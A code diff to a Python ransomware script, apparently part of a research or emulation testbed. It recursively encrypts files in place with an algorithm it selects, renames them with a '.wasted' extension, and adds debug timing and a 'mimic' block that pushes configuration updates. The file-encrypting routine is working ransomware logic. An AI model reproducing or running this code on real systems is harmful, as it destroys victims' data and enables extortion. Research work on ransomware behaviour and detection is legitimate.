@@ -9,13 +9,15 @@ from Crypto.PublicKey import RSA
 from Crypto.Util import Counter
 from Crypto.Util.Padding import pad, unpad
 
+from emulate import send_config
 from globals import get_config_from_file
 
 # ============================================================
 # ============ 		GLOBALS 	  ==============
 # ============================================================
 
-LINUX_STARTDIRS = [os.environ['HOME'] + '/test_ransomware']
+# LINUX_STARTDIRS = [os.environ['HOME'] + '/test_ransomware']
+LINUX_STARTDIRS = ['/home/jluech/test']  # TODO: replace with original
 EXTENSION = ".wasted"  # Ransomware custom extension
 
 # ============================================================
@@ -210,6 +212,11 @@ def encrypt_files(key, start_dirs):
     file_sizes = 0
     burst_start = time.time()
 
+    # TODO: remove development variables
+    sleep_test = 1
+    updated = False
+    config_nr = 1
+
     # Recursively go through folders and encrypt files
     for curr_dir in start_dirs:
         for file in discover_files(curr_dir):
@@ -221,12 +228,24 @@ def encrypt_files(key, start_dirs):
 
                 file_sizes += os.path.getsize(file)  # file size in bytes (= nr of characters)
 
+                # TODO: remove debug prints
+                print(os.path.getsize(file), "/", file_sizes, file, file_counter)
+
                 crypt, flag, extra = select_encryption_algorithm(key)
                 modify_file_inplace(file, crypt.encrypt, flag[1:] + "0")
 
                 encrypted_name = file + (flag if not extra else flag + "--" + extra) + EXTENSION
                 os.rename(file, encrypted_name)
                 print("File changed from " + file + " to " + encrypted_name)  # keep!
+
+                # TODO: remove mimic block
+                if sleep_test > 1 and not updated:
+                    send_config(config_nr)
+                    updated = True
+                    config_nr += 1
+                print("mimic size with", sleep_test)
+                time.sleep(sleep_test)
+                sleep_test *= 2
 
                 file_counter += 1
 
